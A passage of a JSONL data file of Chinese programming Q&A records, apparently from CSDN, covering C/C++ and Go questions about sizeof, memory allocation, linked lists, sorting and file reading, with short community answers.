dsw, 125, 255, CV_THRESH_BINARY_INV);  \n        cvThreshold(gsrc, dsw, 100, 255, CV_THRESH_BINARY);  \n\n        cvFindContours(dsw, storage, &first_contour, sizeof(CvContour), CV_RETR_LIST, CV_CHAIN_APPROX_SIMPLE);  \n        cvZero(dst);  \n        int cnt = 0;  \n        for(; first_contour != 0; first_contour = first_contour->h_next)  \n        {  \n            cnt++;  \n            CvScalar color = CV_RGB(rand()&255, rand()&255, rand()&255);  \n            cvDrawContours(dst, first_contour, color, color, 0, 2, CV_FILLED, cvPoint(0, 0));  \n            CvRect rect = cvBoundingRect(first_contour,0);\n            cvRectangle(dst, cvPoint(rect.x, rect.y), cvPoint(rect.x + rect.width, rect.y + rect.height),CV_RGB(255, 0, 0), 1, 8, 0);\n        }  \n\n        printf(\"the num of contours : %d\\n\", cnt);  \n\n        cvNamedWindow( \"Source\", 1 );  \n        cvShowImage( \"Source\", src );  \n\n        cvNamedWindow( \"dsw\", 1 );  \n        cvShowImage( \"dsw\", dsw );  \n\n        cvNamedWindow( \"Components\", 1 );  \n        cvShowImage( \"Components\", dst );  \n\n    cvReleaseMemStorage(&storage);\n\n        char c=cvWaitKey(10);\n        if(c==27)\n            break;  \n    }\n\n    cvDestroyWindow(\"Source\");\n    cvDestroyWindow(\"dsw\");\n    cvDestroyWindow(\"Components\");\n\n    cvReleaseImage(&pFrame);\n    cvReleaseImage(&gsrc);\n    cvReleaseImage(&src);\n    cvReleaseImage(&dsw);\n    cvReleaseImage(&dst);\n\n    //cvReleaseMemStorage(&storage);\n    cvReleaseCapture(&pCapture);\n\n    return 0;  \n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/787960388756110.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;br /&gt;&lt;strong&gt;bubbleSort函数中for循环()中语句写错了&lt;/strong&gt;&lt;br /&gt;&lt;code class=\"language-javascript\"&gt;改正如下&amp;#xff1a;&lt;/code&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;void &lt;span class=\"hljs-keyword\"&gt;bubbleSort(struct &lt;/span&gt;Hero heroArry[], int len)\n{\n    for (int i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;&lt;span class=\"hljs-comment\"&gt;; i &amp;lt; len-1; i&amp;#43;&amp;#43;)&lt;/span&gt;\n    {\n        for (int &lt;span class=\"hljs-keyword\"&gt;j &lt;/span&gt;&amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;&lt;span class=\"hljs-comment\"&gt;; j &amp;lt; len - i - j; j&amp;#43;&amp;#43;)&lt;/span&gt;\n        {\n            \n            if (heroArry[&lt;span class=\"hljs-keyword\"&gt;j].age &lt;/span&gt;&amp;gt;heroArry[&lt;span class=\"hljs-keyword\"&gt;j &lt;/span&gt;&amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;].age)\n            {\n                struct Hero temp &amp;#61; heroArry[&lt;span class=\"hljs-keyword\"&gt;j];\n&lt;/span&gt;                heroArry[&lt;span class=\"hljs-keyword\"&gt;j] &lt;/span&gt;&amp;#61; heroArry[&lt;span class=\"hljs-keyword\"&gt;j &lt;/span&gt;&amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;];\n                heroArry[&lt;span class=\"hljs-keyword\"&gt;j &lt;/span&gt;&amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;] &amp;#61; temp;\n            }\n \n        }\n    }\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;blockquote&gt;\n&lt;p&gt;&lt;strong&gt;如有帮助&amp;#xff0c;还请帮忙点下采纳&amp;#xff01;感谢&amp;#xff01;&lt;/strong&gt;&lt;/p&gt;\n&lt;/blockquote&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["Microsoft C++ 异常: std::bad_alloc如何解决？", ["#程序报错", "\n", "#", "include", " <iostream>\n#", "include", "<", "string", ">\nusing namespace std;\n\n", "struct", " Hero\n{\n    ", "string", " hName;\n    ", "int", " age;\n    ", "string", " sex;\n};\n\nvoid bubble", "Sort(", "struct", " Hero ", "heroArry", "[], ", "int", " ", "len", ")", "\n{\n    ", "for", " (", "int", " i = ", "0", "; i < len-", "1", "; i++)\n    {\n        ", "for", " (", "int", " j = ", "0", "; j < len - i - i; j++)\n        {\n            \n            ", "if", " (heroArry", "[", "j", "]", ".age >heroArry", "[", "j", " + ", "1", "]", ".age)\n            {\n                ", "struct", " Hero temp = heroArry", "[", "j", "]", ";\n                heroArry", "[", "j", "]", " = heroArry", "[", "j", " + ", "1", "]", ";\n                heroArry", "[", "j", " + ", "1", "]", " = temp;\n            }\n\n        }\n    }\n}\n\nvoid print", "Hero(", "struct", " Hero ", "heroArry", "[], ", "int", " ", "len", ")", "\n{\n    ", "for", " (", "int", " i = ", "0", "; i < len; i++)\n    {\n        cout << ", "\"Name: \"", " << heroArry", "[", "i", "]", ".hName \n            << ", "\" age:\"", " << heroArry", "[", "i", "]", ".age\n            << ", "\" Sex:\"", " << heroArry", "[", "i", "]", ".sex << endl;\n    }\n}\n", "int", " main", "()", " {\n\n    ", "struct", " Hero heroArry", "[", "5", "]", " =\n    {\n        {", "\"Liu\"", ",", "23", ",", "\"Man\"", "},\n        {", "\"Guan\"", ",", "22", ",", "\"Man\"", "},\n        {", "\"Zhang\"", ",", "20", ",", "\"Man\"", "},\n        {", "\"Zhao\"", ",", "21", ",", "\"Man\"", "},\n        {", "\"Diao\"", ",", "19", ",", "\"Women\"", "},\n    };\n\n    ", "int", " len = sizeof(heroArry)", " / ", "sizeof(heroArry", "[", "0", "]", ");\n\n    bubble", "Sort(", "heroArry", ", ", "len", ")", ";\n\n    print", "Hero(", "heroArry", ", ", "len", ")", ";\n\n    system(", "\"pause\"", ");\n    return ", "0", ";\n}\n\n", "\n", "网上说是内存不够了，但是没找到合适的解决办法"]], "Tag": "程序设计"}
{"Answer": "pmsg = （PMSG）malloc (cLinesMax * sizeof (MSG)) ;\r\n这一步就给指针分配了空间大小\r\n使得你可以以数组的方式访问指针空间内的每一个地址", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++结构体指针声明问题。", ["typedef struct tagMSG {", "\n    HWND        hwnd;", "\n    UINT        message;", "\n    WPARAM      wParam;", "\n    LPARAM      lParam;", "\n    DWORD       time;", "\n    POINT       pt;", "\n} MSG, *PMSG, NEAR *NPMSG, FAR *LPMSG;", "\nstatic PMSG  pmsg ;", "\npmsg = （PMSG）malloc (cLinesMax * sizeof (MSG)) ;", "\n for (i = cLinesMax - 1 ; i > 0 ; i--)", "\n {", "\n pmsg[i] = pmsg[i - 1] ;", "\n\n", "##  问题：pmsg明明声明为结构体指针，为何在这里可以当做结构体数组指针 使用啊。谢谢大家帮助解惑。", "\n\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;不能使用sizeof&amp;#xff0c;那个是指针&amp;#xff0c;指针大小是6B&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于fwrite函数写入数据不全", ["这里NewFile变量指向的数据没问题，大小811054字节，但为什么fwrite只写入了6个字节，是什么原因导致的吗", "\n", "断点时", "\n", "写入后的文件，只有6个字节", "\n"]], "Tag": "程序设计"}
{"Answer": "时间基本上没啥明显区别\r\n正常的带参数的函数，一般有以下几步：\r\n1. 用push指令将参数入栈，如果是基本类型，有几个参数就需要几条push指令\r\n2. call指令进入被调用函数，先保存IP寄存器的值，再将函数入口地址存入IP\r\n3. 被调用函数将返回地址和基址EBP压入栈，并分配栈空间需要3条指令\r\npushl %ebp\r\nmovl %esp, %ebp\r\nsubl $xx, %esp\r\n4. 函数返回时恢复栈，需要leave和ret两条指令，leave释放栈空间并恢复EBP，恢复IP寄存器的值\r\n\r\n所以需要6条以上的指令开销，如果参数是结构体的话，需要拷贝复制指令，这个开销就大了。\r\n\r\n提高C++程序运行效率的10个简单方法:http://www.jb51.net/article/54792.htm", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["小白关于调用函数的问题", ["请问下例如要测试多组数据的大小排列可以在int main 一点一点比较 也可以在外面创建个函数比较后调用", "\n请问这两种方法哪个方法在运行的时候更加省时间呢？ 求指教谢谢了"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;搜下内存对齐就知道了&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么这个结构sizeof为8呢", ["如题为什么这个结构sizeof为8呢，int 为4+char为1不是为5吗"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;Your proposed solution is not valid code, it has multiple errors.&lt;/p&gt;\n\n&lt;p&gt;For example &lt;code&gt;GetSize()&lt;/code&gt; has no result type, so you couldn't return anything.&lt;/p&gt;\n\n&lt;p&gt;Next, the expression you return is also a syntax error, it attempts to convert an &lt;code&gt;*int&lt;/code&gt; pointer to &lt;code&gt;int&lt;/code&gt; which is not valid.&lt;/p&gt;\n\n&lt;p&gt;You need to dereference the pointer first, so the correct syntax would be:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;func GetSize(T interface{}) int {\n    size := reflect.TypeOf(T).Size()\n    return int(*(*int)(unsafe.Pointer(size)))\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;&lt;strong&gt;But.&lt;/strong&gt; It makes no sense. &lt;a href=\"https://golang.org/pkg/reflect/#Type\" rel=\"nofollow noreferrer\"&gt;&lt;code&gt;reflect.Type.Size()&lt;/code&gt;&lt;/a&gt; already returns the size (the number of bytes needed to store a value of the given type), so there is no need of that &lt;code&gt;unsafe&lt;/code&gt; magic. What may be confusing is that its return type is &lt;code&gt;uintptr&lt;/code&gt;, but you may simply use that value after converting it to &lt;code&gt;int&lt;/code&gt; for example.&lt;/p&gt;\n\n&lt;p&gt;Simply use:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;func GetSize(v interface{}) int {\n    return int(reflect.TypeOf(v).Size())\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Testing it:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;fmt.Println(\"Size of int:\", GetSize(int(0)))\nfmt.Println(\"Size of int64:\", GetSize(int64(0)))\nfmt.Println(\"Size of [100]byte:\", GetSize([100]byte{}))\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Output (try it on the &lt;a href=\"https://play.golang.org/p/vaKGKyMuFp\" rel=\"nofollow noreferrer\"&gt;Go Playground&lt;/a&gt;):&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;Size of int: 4\nSize of int64: 8\nSize of [100]byte: 100\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;One thing you must not forget: this &lt;code&gt;GetSize()&lt;/code&gt; will not recurisvely examine the size of the passed value. So for example if it's a struct with a pointer field, it will not \"count\" the size of the pointed value, only the size of the pointer field.&lt;/p&gt;\n\n&lt;p&gt;Constructing a &lt;code&gt;GetSize()&lt;/code&gt; that recurisvely counts the total size of a complex data structure is non-trivial due to types like &lt;code&gt;map&lt;/code&gt;. For details, see &lt;a href=\"https://stackoverflow.com/questions/44257522/how-to-get-variable-memory-size-of-variable-in-golang/44258164#44258164\"&gt;How to get variable memory size of variable in golang?&lt;/a&gt;&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在GAE / Go中获取结构的大小", ["\n\n", "I would like to get the size of a structure in GAE/Go.", "\n\n", "I read ", "this", " post and wrote the code as below.", "\n\n", "import (\n    \"reflect\"\n    \"unsafe\"\n)\n\nfunc GetSize(T interface{}) {\n    size := reflect.TypeOf(T).Size()\n    return int((*int)(unsafe.Pointer(size)))\n}\n", "\n\n", "But this code does not work because GAE does not allow to import ", "unsafe", ".", "\n\n", "How can I do this in GAE/Go?", "\n    "]], "Tag": "程序设计"}
{"Answer": "![图片说明](https://img-ask.csdn.net/upload/201809/20/1537443172_657136.gif)\r\n\r\n`如果问题得到解决，麻烦点下我回答右边绿色的采纳，谢谢`", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言单链表初始化问题", ["通过了编译但是在向单链表里输入第二个数字的时候，程序出错并中止。", "\n跪求大佬解答。", "\n#include ", "\n#include ", "\n\n", "typedef int Elemtype;", "\ntypedef struct LNode", "\n{", "\n    Elemtype data;", "\n    struct LNode *next;", "\n}LNode,*LinkList;", "\n\n", "void createlist(LinkList head,int n)", "\n{", "\n    int i;", "\n    LinkList p2;", "\n    head=(LinkList)malloc(sizeof(LNode));", "\n    for( i=0;i<=n;i++)", "\n     {  p2=(LinkList)malloc(sizeof(LNode));  //开辟新结点", "\n           p2=p2->next; //连上新结点", "\n        }", "\n}", "\nvoid iolist(LinkList head,int n)", "\n{", "\n    int i;", "\n    LinkList p;", "\n    p=head->next;", "\n    for(i=0;i\n        scanf(\"%d\",&p->data);", "\n        p=p->next;", "\n    }", "\n    for(i=0;i\n        printf(\"%d\\n\",p->data);", "\n        p=p->next;", "\n    }", "\n}", "\nint main()", "\n{", "\n    int n;", "\n    printf(\"n=\");", "\n    scanf(\"%d\",&n);", "\n    LinkList head;", "\n    createlist(head,n);", "\n    iolist(head,n);", "\n    return 0;", "\n}"]], "Tag": "程序设计"}
{"Answer": "```\r\nprintf(\"请输入您想要的数据\\n\");\r\nscanf(\"%d\\n\",&amp;infor-&gt;score);\r\ntailinsert(m,infor-&gt;score);\r\n修改为\r\nprintf(\"请输入您想要的数据\\n\");\r\ninfor = (L*)malloc(sizeof(L));\r\ninfo-&gt;next = NULL;\r\nscanf(\"%d\\n\",&amp;infor-&gt;score);\r\ntailinsert(m,infor);\r\n```\r\n# 问题解决的话，请点下采纳", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["新手求助！链表库编写尝试出现错误！救救孩子", ["#include", "\n#include", "\n#include", "\ntypedef struct student", "\n{", "\n    int score;", "\n        struct student*next;", "\n}L;", "\nL*create(int date)", "\n{", "\n    L*p=(L*)malloc(sizeof(L));", "\n    if(p=NULL)", "\n{", "\n    printf(\"malloc fair!\");", "\n    return NULL;", "\n}", "\nmemset(p,0,sizeof(L));", "\np->score=date;", "\np->next=NULL;", "\n}", "\nvoid tailinsert( L *ph,L *c)", "\n{", "\n    L*p=ph;", "\n    while(p->next!=NULL)", "\n    {", "\n        p->next=p;", "\n    }", "\n    p->next=c;", "\n}", "\nvoid print(L*ph)", "\n{", "\n    L*p=ph;", "\n    p=p->next;", "\n    while(p!=NULL)", "\n    {", "\n        printf(\"%d\\n\",&p->score);", "\n        p=p->next;", "\n    }", "\n    printf(\"%d\\n\",&p->score);", "\n}", "\nvoid detect(L*ph,int date)", "\n{", "\n    L*pr=ph;", "\n    L*p=ph->next;", "\n    if(p=NULL)", "\n    {", "\n        printf(\"数据为空，无法删除\\n\");", "\n        memset(p,0,sizeof(L));", "\n    }", "\n        else", "\n            while(1)", "\n            {", "\n                pr=p;", "\n                p=p->next;", "\n                if(p=NULL)", "\n                {", "\n                    printf(\"找不到数据\\n\");", "\n                    return;", "\n                }else", "\n                    pr->next=p->next;", "\n                free(p);", "\n            }", "\n\n", "}", "\nint main()", "\n{", "\n    L*m=create(0);", "\n    L*infor;", "\n    while(2)", "\n    {", "\n        printf(\"请输入您想要的数据\\n\");", "\n        scanf(\"%d\\n\",&infor->score);", "\n        tailinsert(m,infor->score);", "\n        printf(\"要继续吗？\\n1.yes\\t2.no\");", "\n        int i=getchar();", "\n        if(i==2)", "\n        {", "\n            break;", "\n        }", "\n        print(m);", "\n    }", "\n        printf(\"请输入要删除的数据\\n\");", "\n        scanf(\"%d\\n\",&infor->score);", "\n        detect(m,infor->score);", "\n        return 0;", "\n}", "\n\n", "这段代码编写完成之后，显示错误信息\n", "\n\n", "error C2664: 'tailinsert' : cannot convert parameter 2 from 'int *' to 'struct student *'", "\n我实在是找不到怎么处理这个，求求大佬们帮帮孩子吧"]], "Tag": "程序设计"}
{"Answer": "去掉free前面的void*", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言中Free函数释放内存为何释放不了！！！！！！！", ["#include ", "\n#include", "\n\n", "void testFree(char *par)", "\n{", "\n    void*free(par);", "\n    par = NULL;", "\n}", "\n\n", "int _tmain(int argc, _TCHAR* argv[])", "\n{", "\n    char path[10] = {\"abc\"};", "\n    char *str = (char *) malloc(100 *sizeof(char));", "\n    memset(str,0x00,100 *sizeof(char));", "\n    memcpy(str,path,strlen(path));", "\n    printf(\"wwl1:%s\\n\",str);", "\n    testFree(str);", "\n    printf(\"wwl2:%s\\n\",str);", "\n return 0;", "\n}", "\n\n", "打印结果为： wwl1:abc  wwl2:abc", "\n\n", "正常的话不是应该为：wwl1:abc wwl2:(null) d 的么？为何输出有误，为何str内存并未释放？testFree函数地址传递有误么？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;if(k &amp;#61;&amp;#61; arr[i]);&lt;br /&gt;分号去掉&lt;br /&gt;for(i&amp;#61;&amp;#61;0;i &amp;lt; sz; i&amp;#61;i&amp;#43;1)&lt;br /&gt;改为&lt;br /&gt;for(i&amp;#61;0;i &amp;lt; sz; i&amp;#61;i&amp;#43;1)&lt;br /&gt;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; arr[]&amp;#61;{&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;6&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;7&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;8&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;9&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;};\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; k&amp;#61;&lt;span class=\"hljs-number\"&gt;7&lt;/span&gt;;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; sz&amp;#61;&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(arr)/&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(arr[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]);\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;(i&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;i &amp;lt; sz; i&amp;#61;i&amp;#43;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;)\n    {\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(k &amp;#61;&amp;#61; arr[i])\n        {\n            &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;找到了&amp;#xff0c;下标是&amp;#xff1a;%d\\n&amp;#34;&lt;/span&gt;,i);\n            &lt;span class=\"hljs-keyword\"&gt;break&lt;/span&gt;;\n        }\n\n    }\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(i&amp;#61;&amp;#61;sz)\n        &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;找不到&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言提问为什么总是0", ["问题遇到的现象和发生背景", "\n", "为什么i不进行自增呢？", "\n", "问题相关代码，请勿粘贴截图", "\n", "int main()", "{", "    int arr[]={1,2,3,4,5,6,7,8,9,10};", "    int k=7;", "    int i=0;", "    int sz=sizeof(arr)/sizeof(arr[0]);", "    for(i==0;i < sz; i=i+1)", "    {", "        if(k == arr[i]);", "        {", "            printf(\"找到了，下表是：%d\\n\",i);", "            break;", "        }", "\n", "}\nif(i", "=", "=", "sz)\n    printf(", "\"找不到\"", ")", ";", "\n\n\n\nreturn ", "0", ";", "\n", "\n", "}", "\n", "运行结果及报错内容", "\n", "找到了，下表是：0", "\n", "我的解答思路和尝试过的方法", "\n", "我想要达到的结果"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;21行构造file对象后&amp;#xff0c;应该检查file的有效性再进行后续文件操作&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["VS2019传递实参时出现无法读取内存的问题，无法打开对应的文件，请问如何解决？", ["主函数：", "\n", "for", " (", "int", " i = ", "0", "; i < Num; i++) {\n        ", "for", " (", "int", " j = ", "0", "; j < num; j++) {\n            stringstream str_l, str_r;\n            string sL, sR;\n            ", "//读取PGM图像文件", "\n            str_l << ", "\"data/Daimler/\"", " << i + ", "1", " << ", "\"/Left/left_\"", " << j + ", "1", " << ", "\".pgm\"", ";\n            str_r << ", "\"data/Daimler/\"", " << i + ", "1", " << ", "\"/Right/right_\"", " << j + ", "1", " << ", "\".pgm\"", "；\n            cout << str_l.", "str", "() << endl;\n            cout << str_r.", "str", "() << endl;\n            sL = str_l.", "str", "();\n            sR = str_r.", "str", "();\n            ", "const", " ", "char", "* sl = sL.c_str();\n            ", "const", " ", "char", "* sr = sR.c_str();\n            process(sl, sr);\n        }\n    }\n", "\n", "process函数", "\n", "void", " ", "process", "(", "const", " ", "char", "* file_1, ", "const", " ", "char", "* file_2)", " ", "{\n\n    cout << ", "\"Processing: \"", " << file_1 << ", "\", \"", " << file_2 << endl;\n\n    ", "// load images", "\n    image<uchar>* I1, * I2;\n    I1 = ", "loadPGM", "(file_1);\n    I2 = ", "loadPGM", "(file_2);\n\n.........\n", "\n", "loadPGM函数", "\n", "void", " ", "pnm_read", "(std::ifstream &file, ", "char", " *buf)", " ", "{\n  ", "char", " doc[BUF_SIZE];\n  ", "char", " c;\n  \n  file >> c;\n  ", "while", " (c == ", "'#'", ") {\n    file.", "getline", "(doc, BUF_SIZE);\n    file >> c;\n  }\n  file.", "putback", "(c);\n  \n  file.", "width", "(BUF_SIZE);\n  file >> buf;\n  file.", "ignore", "();\n}\n\n", "image<uchar> *", "loadPGM", "(", "const", " ", "char", " *name)", " ", "{\n  ", "char", " buf[BUF_SIZE];\n  \n  ", "// read header", "\n  ", "std::ifstream ", "file", "(name, std::ios::in | std::ios::binary)", ";\n  ", "pnm_read", "(file, buf);\n  ", "if", " (", "strncmp", "(buf, ", "\"P5\"", ", ", "2", ")==", "0", ") {\n    std::cout << ", "\"ERROR: Could not read file \"", " << name << std::endl;\n    ", "throw", " ", "pnm_error", "();\n  }\n\n  ", "pnm_read", "(file, buf);\n  ", "int", " width = ", "atoi", "(buf);\n  ", "pnm_read", "(file, buf);\n  ", "int", " height = ", "atoi", "(buf);\n\n  ", "pnm_read", "(file, buf);\n  ", "if", " (", "atoi", "(buf) > UCHAR_MAX) {\n    std::cout << ", "\"ERROR: Could not read file \"", " << name << std::endl;\n    ", "throw", " ", "pnm_error", "();\n  }\n\n  ", "// read data", "\n  image<uchar> *im = ", "new", " ", "image", "<uchar>(width, height);\n  file.", "read", "((", "char", " *)", "imPtr", "(im, ", "0", ", ", "0", "), width * height * ", "sizeof", "(uchar));\n\n  ", "return", " im;\n}\n\n", "\n", "每次一运行到read header时，就显示无法读取内存，然后抛出pnm_error()错误，显示无法读取文件，具体内存区如下：", "\n"]], "Tag": "程序设计"}
{"Answer": "你要让它不退出，需要外侧包一个死循环，参考\r\n\r\nhttp://codepad.org/XAeNGCSO", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在C++中出现的一个问题。", ["在增添借阅者时输入学号后退出，求助，谢谢。", "\n\n", " #include <iostream> \nusing namespace std;\n#include <string> \n#include <fstream>\n#include <iomanip>  \n\n\nconst int Maxr=300; \n\nconst int Maxb=300; \n\nconst int Maxbor=10;\n\n\n\n\n\n\n\n\nclass Reader \n{ \nprivate: \nint tag; \nint No; \nchar name[20]; \nint borbook[Maxbor]; \npublic: \nReader() {} \nchar *getname() {return name;} \nint gettag() {return tag;}  \nint getno() {return No;} \n\nvoid setname(char na[]) \n{ \nstrcpy(name,na); \n} \nvoid delbook(){ tag=1; } \nvoid addreader(int n,char *na) \n{ \ntag=0; \nNo=n; \nstrcpy(name,na); \nfor(int i=0;i<Maxbor;i++) \nborbook[i]=0;\n} \nvoid borrowbook(int bookid)\n{   \nfor(int i=0;i<Maxbor;i++) \n{ \nif (borbook[i]==0) \n{ \nborbook[i]=bookid; \nreturn; \n} \n} \n} \nint retbook(int bookid) \n{ \nfor(int i=0;i<Maxbor;i++) \n{ \nif(borbook[i]==bookid) \n{ \nborbook[i]=0; \nreturn 1; \n} \n} \nreturn 0; \n} \nvoid disp() \n{ \ncout << setw(10) << No <<setw(15) << name<<\"借书检索号：[\";\nfor(int i=0;i<Maxbor;i++) \nif(borbook[i]!=0) \ncout << borbook[i] << \"|\"; \ncout << \"]\"<<endl; \n} \n}; \nclass RDatabase \n{ \nprivate: \n    int top; \nReader read[Maxr]; \npublic: \nRDatabase() \n{ \nReader s; \ntop=-1;\nfstream file(\"reader.txt\",ios::in);  \nwhile (1) \n{ \nfile.read((char *)&s,sizeof(s)); \nif (!file)break;\ntop++; \nread[top]=s; \n} \nfile.close(); \n} \nvoid clear() \n{ \ntop=-1; \n} \nint addreader(int n,char *na) \n{ \nReader *p=query(n); \nif (p==NULL) \n{ \ntop++; \nread[top].addreader(n,na); \nreturn 1; \n} \nreturn 0; \n} \nReader *query(int readerid) \n{ \nfor (int i=0;i<=top;i++) \nif (read[i].getno()==readerid && \nread[i].gettag()==0) \n{ \nreturn &read[i];  \n} \nreturn NULL; \n} \nvoid disp() \n{ \nfor (int i=0;i<=top;i++) \nread[i].disp(); \n}\nvoid readerdata(); \n~RDatabase() \n{ \nfstream file(\"reader.txt\",ios::out); \nfor (int i=0;i<=top;i++) \nif (read[i].gettag()==0) \nfile.write((char *)&read[i],sizeof(read[i])); \nfile.close(); \n} \n}; \nvoid RDatabase::readerdata() \n{ \nchar choice; \nchar rname[20]; \nint readerid; \nReader *r; \n\n\n\n\ncout <<\"\\n\\n\\t\\t\\t借阅者信息\\n\\n\\n\\t\\t 1 增加借阅者信息\\n\\n\\t\\t 2 修改借阅者信息\\n\\n\\t\\t 3 删除借阅者信息\\n\\n\\t\\t 4 查询借阅者信息\\n\\n\\t\\t 0 退出\"<<endl; \ncin >> choice; \nswitch (choice) \n{ \ncase '1': \ncout << \"输入借阅者学号:\"; \ncin >> readerid; \ncin >> rname; \naddreader (readerid,rname); \nbreak; \ncase '2': \ncout << \"输入借阅者学号:\"; \ncin >> readerid; \n r=query(readerid); \nif (r==NULL) \ncout << \" 借阅者信息错误\"<<endl; \nbreak; \n\ncout << \"重新输入姓名:\"; cin >> rname;\nr->setname(rname); \nbreak; \ncase '3': \n    cout << \" 输入借阅者学号:\"; \ncin >> readerid; r=query(readerid); \nif (r==NULL) \ncout <<\" 借阅者信息错误\" << endl; \nbreak; \nr->delbook(); \nbreak;\ncase '4': \ncout << \"输入借阅者学号:\"; \ncin >> readerid; \nr=query(readerid); \nif (r==NULL) \n{ \ncout <<\"学号信息错误\"<< endl; \n} r->disp(); \nbreak; \nbreak; \ncase '5': \ndisp(); \nbreak; \n\ndefault:cout<<\"信息错误，请重新输入：\";\n    break; \n} \n} \n\nclass Book \n{ \nprivate: \nfloat price; \nchar author[10]; \nint tag; \nint No; \nchar place[40];\nchar name[20]; \nint onshelf; \npublic: \nBook(){} \nchar *getname() { return name; } \nint getNo(){ return No; } \nchar *getplace(){ return place;}\nint gettag(){ return tag; } \nchar*getauthor(){return author;} \nchar getprice(){return price;} \nvoid setname(char na[]) \n{ \nstrcpy(name,na); \n} \nvoid setauthor(char au[]) \n{ \nstrcpy(author,au);} \nvoid delbook(){ tag=1;} \nvoid addbook(int N,char *na,char*au,int pr,char *bp)\n{ \ntag=0; \nNo=N; \nprice=pr; \nstrcpy(author,au); \nstrcpy(name,na); \nonshelf=1; \n} \nint borrowbook() \n{ \nif (onshelf==1) \n{ \nonshelf=0; \nreturn 1; \n} \nreturn 0; \n} \nvoid retbook() \n{ \nonshelf=1; \n} \nvoid disp() \n{ \ncout<< setw(6)<< \"检索号: \" << No << setw(18) <<\"书名: \"<< name << setw(10) <<\"作者: 